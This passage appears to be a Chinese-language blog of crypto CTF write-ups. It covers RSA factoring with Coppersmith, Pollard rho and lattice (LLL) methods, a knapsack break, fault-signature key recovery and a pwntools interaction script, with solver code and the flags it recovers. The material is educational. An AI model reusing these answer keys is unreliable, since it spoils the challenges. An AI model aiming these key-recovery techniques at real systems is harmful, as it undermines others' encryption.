<h2 id="总exp"><a href="#总exp" class="headerlink" title="总exp"></a>总exp</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># %%</span><br><span class="line">n = 36535558847082719901201561031181835346574576610950713924924272947759193576365817762980927638691696601293089537315055413746788190208875234794229119049056299551864869870291634941246362436491006904347559559494705922259007299126640817275929491680601926404543198957206717290905220235571289759182878331893962038379</span><br><span class="line">c = 532997872940452282189043430008002793694788439822465302532208754231005799057972378308576109082463996551992533174546386979606697890310597738637156771564229</span><br><span class="line">a = 2694858406312563434474553988904403597551484373358339092528913028454100111881368126493990657117571672510331411186745639563619323775673115439</span><br><span class="line">e = 65537</span><br><span class="line"></span><br><span class="line"># %%</span><br><span class="line"># 法1</span><br><span class="line"># 构造f = 2 * g * x + 1 在模n情况下有解</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(n)[]</span><br><span class="line">f = 2 * a * x + 1</span><br><span class="line">g = int(f.monic().small_roots(X=2^51, beta=0.4)[0])</span><br><span class="line">phi = (a - 1) * (g - 1)</span><br><span class="line">n = a * g</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">m = powmod(c, d, n)</span><br><span class="line">print(m)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># %%</span><br><span class="line"># 法2</span><br><span class="line"># Pollard&#x27;s rho 分解n</span><br><span class="line">def f(x, n):</span><br><span class="line">    return (pow(x, n - 1, n) + 3) % n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def rho(n):</span><br><span class="line">    i = 1</span><br><span class="line">    while True:</span><br><span class="line">        a = getRandomRange(2, n)</span><br><span class="line">        b = f(a, n)</span><br><span class="line">        j = 1</span><br><span class="line">        while True:</span><br><span class="line">            p = GCD(abs(a - b), n)</span><br><span class="line">            print(&#x27;&#123;&#125; in &#123;&#125; circle&#x27;.format(j, i))</span><br><span class="line">            if p == n:</span><br><span class="line">                break</span><br><span class="line">            elif p &gt; 1:</span><br><span class="line">                return (p, n // p)</span><br><span class="line">            else:</span><br><span class="line">                a = f(a, n)</span><br><span class="line">                b = f(f(b, n), n)</span><br><span class="line">            j += 1</span><br><span class="line">        i += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># %%</span><br><span class="line"># 法3</span><br><span class="line"># 神奇非预期</span><br><span class="line">d = invert(e, a - 1)</span><br><span class="line">m = powmod(c, d, a)</span><br><span class="line">print(m)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"># %%</span><br><span class="line"># 法4</span><br><span class="line"># 直接利用等式进行分解，化简可得p*q - 1 = 2gh，g为51bit，h约为972bit，两者相差非常大，利用factordb/yafu进行分解</span><br><span class="line">gh = (n - 1) // 2</span><br><span class="line"># print(gh)</span><br><span class="line">h = 13570850594633462506426369052182298554140635599543685835372377476383038708650421475723391142118956001358520246769650699398490037618758005241062608387057439283872260149565854577827352267289963736282502923131251179400580891491236925451166755184695335564693793568286112036468975877609637392241679</span><br><span class="line">g = 1346104232461691</span><br><span class="line">phi = (a - 1) * (g - 1)</span><br><span class="line">n = a * g</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">m = powmod(c, d, n)</span><br><span class="line">print(m)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>



<h1 id="CryptoCTF2021-HAMUL"><a href="#CryptoCTF2021-HAMUL" class="headerlink" title="[CryptoCTF2021]HAMUL"></a>[CryptoCTF2021]HAMUL</h1><ul>
<li>规约位数</li>
<li>爆破</li>
<li>Relating: HaM3多一层爆破</li>
</ul>
<p><strong>已知信息</strong></p>
<img src="/2023/03/09/Crypto-Write-Up-zh/image-20230706171746617.png" class="" title="image-20230706171746617">

<p><strong>推导</strong><br>$$<br>P &#x3D; 10^{t}p + q<br>$$</p>
<p>$$<br>Q &#x3D; 10^{s}q + p<br>$$</p>
<p>$$<br>PP &#x3D; 10^{s + t}P + Q &#x3D; 10^{s + t}(10^{t}P + Q) + 10^{s}Q + P<br>$$</p>
<p>$$<br>QQ &#x3D; 10^{s + t}Q + P &#x3D; 10^{s + t}(10^{t}Q + P) + 10^{s}P + Q<br>$$</p>
<p>$$<br>N &#x3D; PP \cdot QQ &#x3D; 10^{3(t+s)}pq + \dots + pq<br>$$</p>
<p>$$<br>\Longrightarrow (10^{s + t}(10^{t}p + q) + 10^{s}q + p)(10^{t + s}(10^{s}q + p) + 10^{t}p + q)<br>$$</p>
<p>对$N$进行整除和求模分析，从而得到$pq$十进制的高位和低位。</p>
<p>大致确定$p$，$q$的位数进行爆破。</p>
<p>从而$str(N)[:?] &lt;—&gt; str(pq)[:?]$</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">str(N)[:18] = str(pq)[:?]</span><br><span class="line">str(N)[-18:] = str(pq)[-18:]</span><br><span class="line">len(str(pq)) = 38</span><br><span class="line"></span><br><span class="line">-&gt; 爆破 2 digits</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># %%</span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line">from tqdm import tqdm</span><br><span class="line">low = str(n)[-18:]</span><br><span class="line">high = str(n)[:18]</span><br><span class="line">pq_prob = []</span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">    for j in range(10):</span><br><span class="line">        pq_prob.append(int(high + str(i) + str(j) + low))</span><br><span class="line"># print(pq_prob)</span><br><span class="line"></span><br><span class="line">for pq in tqdm(pq_prob):</span><br><span class="line">    f = factor(pq)</span><br><span class="line">#     print(f)</span><br><span class="line">    if (len(f) == 2 and f[0][0].nbits() == 64):</span><br><span class="line">        p, q = f[0][0], f[1][0]</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">P = int(str(p) + str(q))</span><br><span class="line">Q = int(str(q) + str(p))</span><br><span class="line">PP = int(str(P) + str(Q))</span><br><span class="line">QQ = int(str(Q) + str(P))</span><br><span class="line">assert n == PP*QQ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># %%</span><br><span class="line">d = invert(65537, (PP-1)*(QQ-1))</span><br><span class="line">m = powmod(c, d, n)</span><br><span class="line">print(long_to_bytes(m).decode())</span><br></pre></td></tr></table></figure>

<img src="/2023/03/09/Crypto-Write-Up-zh/1.png" class="" width="1">

<img src="/2023/03/09/Crypto-Write-Up-zh/2.png" class="" width="2">

<h1 id="DCIC2023-final-easybag"><a href="#DCIC2023-final-easybag" class="headerlink" title="[DCIC2023-final]easybag"></a>[DCIC2023-final]easybag</h1><ul>
<li>LLL规约</li>
</ul>
<p>背包，但是模比较小，所以用常见的那几个格都打不了，可能的方法有二：一是用babai求解cvp，二是把原来的格子多加一维，放个模数进去规约，这里用的第二种：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 构造格子</span></span><br><span class="line">A = Matrix(ZZ, <span class="number">66</span>, <span class="number">66</span>)</span><br><span class="line"><span class="comment"># print(A)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    A[i,i] = <span class="number">1</span></span><br><span class="line">    A[i,<span class="number">65</span>] = -pubkey[i]</span><br><span class="line">    </span><br><span class="line">A[<span class="number">64</span>,<span class="number">64</span>] = <span class="number">1</span></span><br><span class="line">A[<span class="number">64</span>,<span class="number">65</span>] = c</span><br><span class="line">A[<span class="number">65</span>,<span class="number">65</span>] = p</span><br><span class="line"><span class="comment"># print(A)</span></span><br><span class="line"><span class="built_in">print</span>(A.LLL()[<span class="number">0</span>])</span><br><span class="line"><span class="comment"># (0, -1, 0, 0, 0, -1, 0, -1, -1, -1, 0, 0, 0, -1, -1, -1, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, -1, 0, -1, -1, -1, 0, 0, 0, 0, 0, 0, -1, -1, 0, -1, 0, 0, -1, 0, 0, 0, -1, -1, -1, 0, 0, -1, -1, 0, 0, 0, -1, 0, -1, -1, -1, 0)</span></span><br></pre></td></tr></table></figure>

<p>LLL算法计算出来的长度为<code>66</code>，强制使用固定长度为<code>64</code>的向量进行计算。</p>
<p>所以概括一下，先多加一维进行规约，再使用原来固定长度的向量继续计算，保证一致。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># k = (0, -1, 0, 0, 0, -1, 0, -1, -1, -1, 0, 0, 0, -1, -1, -1, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, -1, 0, -1, -1, -1, 0, 0, 0, 0, 0, 0, -1, -1, 0, -1, 0, 0, -1, 0, 0, 0, -1, -1, -1, 0, 0, -1, -1, 0, 0, 0, -1, 0, -1, -1)</span></span><br><span class="line">k = A.LLL()[<span class="number">0</span>][<span class="number">0</span>:<span class="number">64</span>]</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> k:</span><br><span class="line">    <span class="keyword">if</span> i:</span><br><span class="line">        key += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key += <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(key))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(key, <span class="number">2</span>))[<span class="number">2</span>:])</span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">int</span>(key, <span class="number">2</span>))[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(key))</span><br><span class="line">aes = AES.new(key = key*<span class="number">2</span>, mode=AES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span>(aes.decrypt(enc))</span><br><span class="line"><span class="comment"># 64</span></span><br><span class="line"><span class="comment"># 45c76015c0d2398b</span></span><br><span class="line"><span class="comment"># 8</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;e42f0ab28e1c5fb04bbb0c797a2cd951&#125;\n\n\n\n\n\n\n\n\n\n&#x27;</span></span><br></pre></td></tr></table></figure>



<h1 id="DCIC2023-final-ddddhm"><a href="#DCIC2023-final-ddddhm" class="headerlink" title="[DCIC2023-final]ddddhm"></a>[DCIC2023-final]ddddhm</h1><ul>
<li>条件判断得到<code>part_d</code></li>
<li>Coppersmith-lowd</li>
</ul>
<h2 id="part-d的求解"><a href="#part-d的求解" class="headerlink" title="part_d的求解"></a>part_d的求解</h2><p>本题的关键在于<code>fault_signature</code>函数。注意到在该函数中，每次进行加密使用的$d$是由$d2$变化得来的，且每次仅变化1位。由于$d2$肯定是奇数，所以第一次变换时，使用的结果肯定是$d2-1$，即：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">msg_fault_sigs[<span class="number">0</span>] = <span class="built_in">pow</span>(msg, d2 - <span class="number">1</span>, n)</span><br></pre></td></tr></table></figure>

<p>剩下部分依旧按照该思路进行判断，由于存在不确定性，利用计算出<code>msg_fault_sigs[0]</code>进行辅助判断，从而计算出<code>part_d</code>：</p>
<p><em>字符串连接顺序需要注意，从低位到高位。</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">msg = bytes_to_long(<span class="string">b&#x27;ddddhm&#x27;</span>)</span><br><span class="line">pows = <span class="number">2</span></span><br><span class="line">part_d = <span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(msg_fault_sigs)):</span><br><span class="line">    <span class="comment"># here should pay attention to the string&#x27;s order</span></span><br><span class="line">    <span class="keyword">if</span>((msg_fault_sigs[i] * <span class="built_in">pow</span>(msg, pows-<span class="number">1</span>, n) - msg_fault_sigs[<span class="number">0</span>]) % n)==<span class="number">0</span>:</span><br><span class="line">        part_d = <span class="string">&quot;1&quot;</span> + part_d</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        part_d = <span class="string">&quot;0&quot;</span> + part_d</span><br><span class="line">    pows *= <span class="number">2</span></span><br><span class="line">part_d = <span class="built_in">int</span>(part_d, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(part_d.bit_length())</span><br><span class="line"><span class="built_in">print</span>(part_d)</span><br><span class="line"><span class="comment"># 681</span></span><br><span class="line"><span class="comment"># 9519637250511849605092115946924531911819643854022344770386391196998091816870433223070160919249620469852108874736739746738237759468821919367674447147826813269165414967606625427817526475380034928092527497223</span></span><br></pre></td></tr></table></figure>

<h2 id="coppersmith攻击-已知d低位"><a href="#coppersmith攻击-已知d低位" class="headerlink" title="coppersmith攻击-已知d低位"></a>coppersmith攻击-已知d低位</h2><p>使用通用脚本计算得$p$。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">partial_p</span>(<span class="params">p0, kbits, n</span>):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    nbits = n.nbits()</span><br><span class="line"></span><br><span class="line">    f = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(nbits//<span class="number">2</span>-kbits), beta=<span class="number">0.3</span>)  <span class="comment"># find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.3</span></span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(mpz(<span class="number">2</span>^kbits*x0 + p0), mpz(n))</span><br><span class="line">        <span class="keyword">return</span> ZZ(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_p</span>(<span class="params">d0, kbits, e, n</span>):</span><br><span class="line">    X = var(<span class="string">&#x27;X&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        results = solve_mod([e*d0*X - k*X*(n-X+<span class="number">1</span>) + k*n == X], <span class="number">2</span>^kbits)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            p0 = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            p = partial_p(p0, kbits, n)</span><br><span class="line">            <span class="keyword">if</span> p:</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">p = find_p(part_d, <span class="number">1024</span>-part_d.bit_length(), <span class="number">7</span>, n)</span><br><span class="line"><span class="comment"># 12800335172378590918875662486524333103691215133150369430200420149970735808370081784433007260276277361253378071964953226360740601994258142232798414547092861</span></span><br></pre></td></tr></table></figure>

<p>已知$p$之后那就直接转换成基础RSA了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">q = n // p</span><br><span class="line">d = invert(<span class="number">0x10001</span>, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = powmod(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(unpad(long_to_bytes(m)).decode())</span><br><span class="line"><span class="comment"># 280953633736431747947064628051293908189096295024698457307220800187630550375386320255208827601751935813552184196283101709554718133038728081799604794900708412174536625884689548714026681568503654577602432205861968756823980122854293696554980209163635856940269021305243235482137890575873848821429361178108376901</span></span><br><span class="line"><span class="comment"># flag&#123;54b5dc19-5037-46c3-8afe-45394f236852&#125;</span></span><br></pre></td></tr></table></figure>



<h1 id="HDCTF2023-math-rsa"><a href="#HDCTF2023-math-rsa" class="headerlink" title="[HDCTF2023]math_rsa"></a>[HDCTF2023]math_rsa</h1><ul>
<li>二次剩余</li>
</ul>
<p>主要通过生成参数的满足条件进行判定的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r=getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">assert</span> r%<span class="number">4</span>==<span class="number">3</span></span><br><span class="line"><span class="comment"># 可得r模4余3</span></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(p,(r-<span class="number">1</span>)//<span class="number">2</span>,r)==<span class="number">1</span></span><br><span class="line"><span class="comment"># 满足二次剩余相关，勒让德符号为1，则，p是r的二次剩余</span></span><br><span class="line"><span class="comment"># 即 p = x^2 mod r</span></span><br><span class="line">a=<span class="built_in">pow</span>(p,<span class="number">2</span>,r)</span><br><span class="line"><span class="comment"># a = p^2 mod r， </span></span><br></pre></td></tr></table></figure>

<p><strong>欧拉准则</strong>，“$a$是模$p$的二次剩余“是”$a^{\frac{p - 1}{2}} \equiv 1\mod p$“的充要条件。</p>
<p>判定为二次剩余类的，直接使用<code>Tonelli_Shanks()</code>求解$p$即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Tonelli_Shanks</span>(<span class="params">a, p</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    no satisfy 3mod4，to calculate remainder</span></span><br><span class="line"><span class="string">    or p is prime</span></span><br><span class="line"><span class="string">    references:</span></span><br><span class="line"><span class="string">    - https://rosettacode.org/wiki/Tonelli-Shanks_algorithm</span></span><br><span class="line"><span class="string">    - [V&amp;N2020]Easy RSA</span></span><br><span class="line"><span class="string">    - 可等价于from sympy.ntheory.residue_ntheory import nthroot_mod(c, 2, r)-&gt; x^2 = c mod r</span></span><br><span class="line"><span class="string">    - 可等价于sagemath: f.roots()</span></span><br><span class="line"><span class="string">    :param a: remainder</span></span><br><span class="line"><span class="string">    :param p: modulo</span></span><br><span class="line"><span class="string">    :return: r</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># STEP0</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">pow</span>(a, (p-<span class="number">1</span>)//<span class="number">2</span>, p) == <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> p % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> Fermat_2remainder(a, p)</span><br><span class="line">    <span class="comment"># STEP1</span></span><br><span class="line">    q = p - <span class="number">1</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> q % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        q = q // <span class="number">2</span></span><br><span class="line">        s += <span class="number">1</span></span><br><span class="line">    <span class="comment"># STEP2</span></span><br><span class="line">    <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, p):</span><br><span class="line">        <span class="keyword">if</span> Legendre_Symbol(z, p) == p - <span class="number">1</span>:</span><br><span class="line">            c = <span class="built_in">pow</span>(z, q, p)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># STEP3</span></span><br><span class="line">    r = <span class="built_in">pow</span>(a, (q+<span class="number">1</span>)//<span class="number">2</span>, p)</span><br><span class="line">    t = <span class="built_in">pow</span>(a, q, p)</span><br><span class="line">    m = s</span><br><span class="line">    <span class="comment"># STEP4</span></span><br><span class="line">    <span class="keyword">if</span> t % p == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> t % p != <span class="number">1</span>:</span><br><span class="line">            temp = <span class="built_in">pow</span>(t, <span class="number">2</span>**(i + <span class="number">1</span>), p)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> temp % p == <span class="number">1</span>:</span><br><span class="line">                b = <span class="built_in">pow</span>(c, <span class="number">2</span>**(m - i - <span class="number">1</span>), p)</span><br><span class="line">                r = r*b % p</span><br><span class="line">                c = b*b % p</span><br><span class="line">                t = t*c % p</span><br><span class="line">                m = i</span><br><span class="line">                i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">p = Tonelli_Shanks(a, r)</span><br><span class="line"><span class="keyword">assert</span> isPrime(p) == <span class="number">1</span></span><br><span class="line"><span class="comment"># -&gt; 基础RSA</span></span><br></pre></td></tr></table></figure>



<h1 id="HUBUCTF-2022-新生赛-ezMath"><a href="#HUBUCTF-2022-新生赛-ezMath" class="headerlink" title="[HUBUCTF 2022 新生赛]ezMath"></a>[HUBUCTF 2022 新生赛]ezMath</h1><ul>
<li>pwn交互</li>
</ul>
<p>很直接，跟靶机交互，做100道简单数学题。惯例先过哈希，然后交互做题。</p>
<p>适合作为交互题目的练习题。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>(<span class="params">known: <span class="built_in">bytes</span>,hashcode</span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	know sha256(XXXX+known) == hashcode</span></span><br><span class="line"><span class="string">	get the XXXX</span></span><br><span class="line"><span class="string">	charset = letter + digits</span></span><br><span class="line"><span class="string">	XXXX has four char</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span></span><br><span class="line">	charset = string.ascii_letters + string.digits</span><br><span class="line">	<span class="keyword">for</span> a <span class="keyword">in</span> charset:</span><br><span class="line">		<span class="keyword">for</span> b <span class="keyword">in</span> charset:</span><br><span class="line">			<span class="keyword">for</span> c <span class="keyword">in</span> charset:</span><br><span class="line">				<span class="keyword">for</span> d <span class="keyword">in</span> charset:</span><br><span class="line">					guess = a + b + c + d</span><br><span class="line">					<span class="keyword">if</span> sha256(guess.encode()+known).hexdigest() == hashcode:</span><br><span class="line">						<span class="keyword">return</span> guess</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">link = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 过SHA256</span></span><br><span class="line"><span class="comment"># 接收</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[+] sha256(XXXX+B79N1NIZWlK7gHKB) == 40183d93c30a0316b45ebfabb07db7dc951e143e3fa3c4a004667e2f081c144b</span></span><br><span class="line"><span class="string">[+] Plz Tell Me XXXX :Hvoc</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 读取到一直读到 sha256(XXXX+ 的 pattern 出现为止</span></span><br><span class="line">link.recvuntil(<span class="string">b&#x27;sha256(XXXX+&#x27;</span>)</span><br><span class="line">str1 = link.recvuntil(<span class="string">b&#x27;)&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">link.recvuntil(<span class="string">b&#x27;== &#x27;</span>)</span><br><span class="line">str2 = link.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">send_XXXX = proof_of_work(str1, str2.decode()).encode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送</span></span><br><span class="line">link.sendlineafter(<span class="string">b&#x27;Plz Tell Me XXXX :&#x27;</span>, send_XXXX)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 100次数学计算</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    link.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">    link.recvuntil(<span class="string">b&#x27; &#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    s = link.recvuntil(<span class="string">b&#x27;= &#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    sol_out = <span class="built_in">str</span>(<span class="built_in">eval</span>(s)).encode()</span><br><span class="line">    send_sol_out = link.sendlineafter(<span class="string">b&#x27;?&#x27;</span>, sol_out)</span><br><span class="line">    link.recvline()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结束连接</span></span><br><span class="line">link.recvall()</span><br><span class="line"><span class="comment"># NSSCTF&#123;c629810b-e1b2-40f6-ac92-c88fb041d422&#125;</span></span><br></pre></td></tr></table></figure>



<h1 id="NSSCTF-round11-ez-fac"><a href="#NSSCTF-round11-ez-fac" class="headerlink" title="[NSSCTF-round11]ez_fac"></a>[NSSCTF-round11]ez_fac</h1><ul>
<li>论文题</li>
</ul>
<p><strong>KEY</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(a0,<span class="number">2</span>) + e * <span class="built_in">pow</span>(b0,<span class="number">2</span>) == n</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(a1,<span class="number">2</span>) + e * <span class="built_in">pow</span>(b1,<span class="number">2</span>) == n</span><br></pre></td></tr></table></figure>

<p>$$<br>a_0^{2} + e \times b_0^{2} &#x3D;n<br>$$</p>
<p>$$<br>a_1^{2} + e\times b_1^{2} &#x3D; n<br>$$</p>
<p>根据论文中总结算法。</p>
<img src="/2023/03/09/Crypto-Write-Up-zh/1.jpg" class="" title="note">

<p>$N$存在两种形式的分解，那么$gcd(N, ad -bc)&#x3D;p$一定成立。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">temp = a0 * b1 - a1 * b0</span><br><span class="line">p = gcd(n, temp)</span><br><span class="line">q = n // p</span><br><span class="line"><span class="keyword">assert</span> p.bit_length() == <span class="number">512</span></span><br><span class="line"><span class="keyword">assert</span> q.bit_length() == <span class="number">512</span></span><br><span class="line">e = (n - a0*a0)//(b0*b0)</span><br><span class="line"><span class="keyword">assert</span> e.bit_length() == <span class="number">128</span></span><br><span class="line">d = invert(e, (p - <span class="number">1</span>)*(q - <span class="number">1</span>))</span><br><span class="line">m = powmod(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>



<h1 id="DCIC2023-math-exam"><a href="#DCIC2023-math-exam" class="headerlink" title="[DCIC2023]math_exam"></a>[DCIC2023]math_exam</h1><h2 id="challenge-1"><a href="#challenge-1" class="headerlink" title="challenge 1"></a>challenge 1</h2><ul>
<li>deduction</li>
</ul>
<p><strong>KEY</strong><br>$$<br>leak \equiv (n + p) \mod (q-1)<br>$$</p>
<p>$$<br>n &#x3D; p \times q<br>$$</p>
<p><strong>DEDUCTION-1</strong><br>$$<br>leak \equiv (p \times q + p )\mod (q-1) \equiv p(q + 1) \mod (q-1) \equiv 2p \mod (q-1)<br>$$</p>
<p>$$<br>\because p &gt; q<br>$$</p>
<p>$$<br>\therefore p \mod (q-1) &#x3D; p - (q - 1)<br>$$</p>
<p>$$<br>\Longrightarrow leak &#x3D; 2(p-(q-1))<br>$$</p>
<p>利用<code>sympy</code>中的<code>solve()</code>计算<code>p</code>以及<code>q</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p1 = var(<span class="string">&#x27;p1&#x27;</span>)</span><br><span class="line">q1 = var(<span class="string">&#x27;q1&#x27;</span>)</span><br><span class="line">sol1 = solve([<span class="number">2</span>*p1 - <span class="number">2</span>*(q1-<span class="number">1</span>) - leak1, p1*q1 - n1], [p1, q1])</span><br><span class="line"><span class="comment"># p1 = 11060083511635869933802569808428381768947206326091523957729804139074727442704400779515603361330886302679144280198610157348614007053927945774770324805383761</span></span><br><span class="line"><span class="comment"># q1 = 10951764080317305242419751556869357195913698564129507860483453991974582578672251918471161965453710637975575181911693960925380203354175653252256241955673123</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>DEDUCTION-2</strong></p>
<p>依旧先得到:<br>$$<br>leak \equiv 2p \mod (q-1)<br>$$</p>
<p>$$<br>leak &#x3D; 2p + k(q-1)<br>$$</p>
<p>一般来说，$k$ 的量级不会太大，可以直接<strong>爆破</strong>。而且$p &gt; q$，基本情况下可简化为$p - (q - 1)$。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P.&lt;x&gt; = PolynomialRing(ZZ)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">    f = k * (x - <span class="number">1</span>) * x + leak1 * x - <span class="number">2</span> * n1</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        q1 = f.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># print(q1)</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">p1 = n1 // q1</span><br></pre></td></tr></table></figure>



<h2 id="challenge-2"><a href="#challenge-2" class="headerlink" title="challenge 2"></a>challenge 2</h2><ul>
<li>crack</li>
<li>limitation</li>
</ul>
<p><strong>KEY</strong><br>$$<br>leak &#x3D; d + p + q<br>$$</p>
<p>$$<br>e\cdot d \equiv 1 \mod phi<br>$$</p>
